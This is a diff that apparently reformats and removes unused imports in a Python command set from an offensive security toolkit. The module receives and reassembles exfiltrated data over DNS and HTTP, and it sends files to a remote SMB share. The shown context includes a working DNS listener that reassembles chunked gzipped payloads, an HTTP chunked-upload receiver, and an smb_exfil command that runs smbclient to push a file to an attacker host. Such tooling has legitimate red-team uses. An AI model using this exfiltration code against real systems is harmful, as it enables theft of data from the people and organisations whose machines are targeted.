@@ -12,19 +12,13 @@ import hashlib
 import json
 import os
 import re
-import socket
-import struct
 import threading
 import time
-from pathlib import Path
 
 import cmd2
 
 from cli.commands._base import LazyOwnCommandSet
 from utils import (
-    GREEN,
-    RESET,
-    YELLOW,
     exfiltration_category,
     print_error,
     print_msg,
@@ -65,6 +59,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         Requires a cooperating DNS server for the controlled domain.
         """
         import shlex
+
         args = shlex.split(line)
         domain = self._extract(args, "--domain") or self.params.get("domain", "")
         dns_type = self._extract(args, "--type") or "A"
@@ -109,6 +104,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         chunks. Supports A, TXT, and AAAA query types.
         """
         import shlex
+
         args = shlex.split(line)
         port = int(self._extract(args, "--port") or "53")
         domain = self._extract(args, "--domain") or self.params.get("domain", "")
@@ -117,6 +113,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         os.makedirs(output_dir, exist_ok=True)
 
         import socket as sock_module
+
         sock = sock_module.socket(sock_module.AF_INET, sock_module.SOCK_DGRAM)
         sock.setsockopt(sock_module.SOL_SOCKET, sock_module.SO_REUSEADDR, 1)
         bind_addr = self.params.get("lhost", "0.0.0.0")
@@ -166,9 +163,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
                 pending[file_hash][chunk_idx] = decoded
 
                 if len(pending[file_hash]) >= total:
-                    ordered = b"".join(
-                        pending[file_hash][i] for i in sorted(pending[file_hash].keys())
-                    )
+                    ordered = b"".join(pending[file_hash][i] for i in sorted(pending[file_hash].keys()))
                     try:
                         decompressed = gzip.decompress(ordered)
                     except Exception:
@@ -215,6 +210,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         Supports chunked uploads with X-Chunk-* headers for reassembly.
         """
         import shlex
+
         args = shlex.split(line)
         port = int(self._extract(args, "--port") or "8888")
         output_dir = self._extract(args, "--output") or "sessions/http_exfil"
@@ -223,7 +219,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         output_dir = os.path.realpath(output_dir)
 
         try:
-            from http.server import HTTPServer, BaseHTTPRequestHandler
+            from http.server import BaseHTTPRequestHandler, HTTPServer
         except ImportError:
             print_error("HTTP server not available.")
             return
@@ -241,17 +237,13 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
                 safe_name = _sanitize_filename(file_name)
 
                 if chunk_idx is not None and chunk_total is not None:
-                    stage_dir = os.path.realpath(
-                        os.path.join(output_dir, f".staging_{safe_name}")
-                    )
+                    stage_dir = os.path.realpath(os.path.join(output_dir, f".staging_{safe_name}"))
                     if not stage_dir.startswith(output_dir + os.sep):
                         self.send_response(403)
                         self.end_headers()
                         return
                     os.makedirs(stage_dir, exist_ok=True)
-                    chunk_path = os.path.realpath(
-                        os.path.join(stage_dir, f"chunk_{int(chunk_idx):04d}")
-                    )
+                    chunk_path = os.path.realpath(os.path.join(stage_dir, f"chunk_{int(chunk_idx):04d}"))
                     if not chunk_path.startswith(stage_dir + os.sep):
                         self.send_response(403)
                         self.end_headers()
@@ -277,6 +269,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
                         with open(out_path, "wb") as f:
                             f.write(full_data)
                         import shutil
+
                         shutil.rmtree(stage_dir, ignore_errors=True)
                         print_succ(f"Reassembled: {out_path} ({len(full_data)} bytes)")
                 else:
@@ -317,6 +310,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         on the attacker machine (e.g., impacket-smbserver).
         """
         import shlex
+
         args = shlex.split(line)
         if not args or args[0].startswith("--"):
             print_error("Usage: smb_exfil <file_path> [--share <share_name>] [--host <smb_host>]")
@@ -335,7 +329,9 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
             return
 
         file_name = os.path.basename(file_path)
-        self.cmd(f"smbclient //{smb_host}/{share} -c 'put {file_path} {file_name}' -N --option='client min protocol=SMB2'")
+        self.cmd(
+            f"smbclient //{smb_host}/{share} -c 'put {file_path} {file_name}' -N --option='client min protocol=SMB2'"
+        )
         print_msg(f"Exfiltrated {file_path} to \\\\{smb_host}\\{share}\\{file_name}")
 
     @cmd2.with_category(exfiltration_category)
@@ -348,6 +344,7 @@ class DNSExfilCommandSet(LazyOwnCommandSet):
         for receiving exfiltrated data via all transports.
         """
         import shlex
+
         args = shlex.split(line)
         start_all = not args or "--all" in args
         start_dns = start_all or "--dns" in args
